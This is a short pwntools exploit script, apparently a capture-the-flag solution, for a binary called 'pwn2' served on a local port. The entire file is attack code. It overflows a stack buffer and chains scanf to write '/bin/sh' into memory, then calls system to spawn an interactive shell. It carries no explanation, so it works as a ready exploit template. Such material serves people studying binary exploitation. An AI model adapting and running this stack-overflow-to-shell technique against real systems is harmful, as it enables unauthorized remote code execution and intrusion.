from pwn import *

context(log_level="debug")

# p = process('./pwn2')
p = remote('127.0.0.1',10089)
elf = ELF("pwn2")
system_plt = elf.symbols["system"]
scanf_plt = elf.symbols["__isoc99_scanf"]
data = 0x804A024
_s = 0x8048601
pp_ret = 0x080485ca
p.recvuntil('\n')
payload  = ''
payload += 'a'*(0x3a+4)
payload += p32(scanf_plt)+p32(pp_ret)+p32(_s)+p32(data)
payload += p32(system_plt)+p32(0)+p32(data)
p.sendline(payload)
p.sendline('/bin/sh\0')
p.interactive()